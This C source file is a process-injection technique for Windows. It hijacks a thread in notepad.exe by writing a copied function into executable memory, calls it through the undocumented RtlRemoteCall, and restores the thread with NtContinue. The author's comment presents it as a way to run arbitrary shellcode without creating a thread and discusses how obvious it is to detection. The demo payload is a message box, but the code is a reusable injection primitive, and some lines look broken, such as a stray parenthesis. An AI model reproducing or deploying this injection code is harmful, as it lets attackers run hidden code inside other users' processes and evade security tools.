/* 
 Using RtlRemoteCall to jump to arbitrary injected function which uses a structured argument
 which stores all the execution details
 Normally RtlRemoteCall only allows 4 arguments to be passed to a function
 This method does a few things:
 -As many arguments as you like
 -Access to the return value
 -Works in x64 and x86
 -Restore execution after redirection
 
 I really like this method as it means I can pretty much write any arbitrary code as shellcode
 without going through the assembly + no thread creation to hijack execution
 
 I would imagine this is quite an obvious exploit, RtlRemoteCall is very undocumented,
 it could still be useful because playing with context without a function might be even more obvious

*/

#include <stdio.h>
#include <windows.h>
#include <tlhelp32.h>
   
#pragma comment (lib, "User32.lib")


typedef NTSTATUS (NTAPI * RtlRemoteCall_t)(
	HANDLE	Process,
	HANDLE	Thread,
	PVOID	CallSite,
	ULONG	ArgumentCount,
	PULONG	Arguments,
	BOOLEAN	PassContext,
	BOOLEAN	AlreadySuspended
);

typedef int (WINAPI * MessageBox_t)(
	HWND 	hWnd,
	LPCSTR	lpText,
	LPCSTR	lpCaption,
	UINT	uType
);

typedef NTSTATUS (NTAPI * NtContinue_t)(
	PCONTEXT ThreadContext,
	BOOLEAN RaiseAlert 
);


int classicFindProcess( char * pName){
	
	HANDLE hProcessSnap;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;
	DWORD dwPriorityClass;
	
	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	
	pe32.dwSize = sizeof( PROCESSENTRY32 );
	
	do {
		
		if (!stricmp( pName, pe32.szExeFile)) {
			CloseHandle( hProcessSnap );
			return pe32.th32ProcessID;
		}
	  
	} while( Process32Next( hProcessSnap, &pe32 ) );

	  CloseHandle( hProcessSnap );
	  return -1;
}

int FindThread(int PID) {
	
	HANDLE hThreadSnap = INVALID_HANDLE_VALUE; 
	THREADENTRY32 te32; 
	
	hThreadSnap = CreateToolhelp32Snapshot( TH32CS_SNAPTHREAD, 0 ); 
		if( hThreadSnap == INVALID_HANDLE_VALUE ) return 1; 
	
	te32.dwSize = sizeof(THREADENTRY32 ); 
 
	if( !Thread32First( hThreadSnap, &te32 ) ) return 1;

	do { 

    if( te32.th32OwnerProcessID == PID ) return te32.th32ThreadID;
	
  } while( Thread32Next(hThreadSnap, &te32 ) );
	
	return -1;
	
}

typedef struct Arg {

	// primary function (can be multiple) to execute
	// edit function and parameters as required
	MessageBox_t pMessageBox;
	
	HWND   param1;
	char param2[50];
	char param3[50];
	UINT   param4;

	// required to not crash process
	// context will be passed to the process so it can restore itself 
	NtContinue_t pNtContinue;
	CONTEXT context;
	
	// change return type as needed
	NTSTATUS ret;

};


void shellcode(Arg * arg){
	
	arg->ret = arg->pMessageBox(arg->param1, arg->param2, arg->param3, arg->param4);
	arg->pNtContinue( &arg->context, 0);
	
}
void shellcode_end (void){}



int main() {
	
	// init function
	RtlRemoteCall_t pRtlRemoteCall = (RtlRemoteCall_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "RtlRemoteCall");
			
	// open process & thread
	int PID;
	int TID; 
	
	PID = classicFindProcess("notepad.exe");
	if (PID < 0){
		printf("Can't find the process\n");
		return -1;
	}
	
	TID = FindThread(PID);
	if (TID < 0){
		printf("Can't find a thread\n");
		return -1;
	}	
	
	HANDLE hProc = OpenProcess( PROCESS_ALL_ACCESS, FALSE, PID);
	HANDLE hThread = OpenThread( THREAD_ALL_ACCESS, FALSE, TID);

	if (hProc == 0){
		printf("Can't open process\n");
		return -1;		
	}
	if (hThread == 0){
		printf("Can't open thread\n");
		return -1;		
	}		

	char prolog[] = { 0x49, 0x8b, 0xcc }; // mov rcx, r12 (in x64 arch rtl incorrectly places first arg in r12)
	int prolog_size = sizeof(prolog);
	
	void * rtl_function = VirtualAllocEx(hProc, 0, 0x2000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	
	#ifdef _WIN64 
		(WriteProcessMemory(hProc, rtl_function, prolog, prolog_size, NULL);
	#else
		prolog_size = 0;
	#endif

	void * shellcode_addr = &shellcode;
	size_t shellcode_len = (size_t) ((char *)&shellcode_end - (char *)&shellcode);
	
	WriteProcessMemory(hProc, (char *)rtl_function + prolog_size, &shellcode, shellcode_len, NULL);
		
	void * arg_param = (void *)((char *)rtl_function + shellcode_len + prolog_size);
	
	Arg arg;
	// functions
	arg.pMessageBox = (MessageBox_t) GetProcAddress(LoadLibrary("User32.dll"), "MessageBoxA");	
	arg.pNtContinue = (NtContinue_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtContinue");	
	
	// parameters
	arg.param1 = 0;
	// with strings actual characters should be passed not pointers
	// unless you will write the string manually later, this method is easier
	strcpy_s(arg.param2, 50, "text");
	strcpy_s(arg.param3, 50, "text");
	arg.param4 = MB_OK;
	
	// suspend thread & get context
	arg.context.ContextFlags = CONTEXT_FULL;
	SuspendThread(hThread);
	GetThreadContext(hThread, &arg.context);
	
	// place it in mem
	WriteProcessMemory( hProc, arg_param, &arg, sizeof(arg), NULL);
	
	printf("%Remote function %p\n", rtl_function);
	printf("Remote arguments %p\n", arg_param);
	printf("Return value %x\n", (char *)&arg.ret - (DWORD)&arg );
	
	NTSTATUS status = pRtlRemoteCall(hProc, hThread, rtl_function, 1, (PULONG) &arg_param, 1, 1);
	ResumeThread(hThread);

	NTSTATUS ret;
	
	getchar();
	ReadProcessMemory( hProc, (char *)arg_param + (DWORD)((char *)&arg.ret - (DWORD)&arg), &ret, 10, NULL);
	
	printf("Return value: %X\n", ret);

	CloseHandle(hProc);
	CloseHandle(hThread);
	
	return 0;
	
}
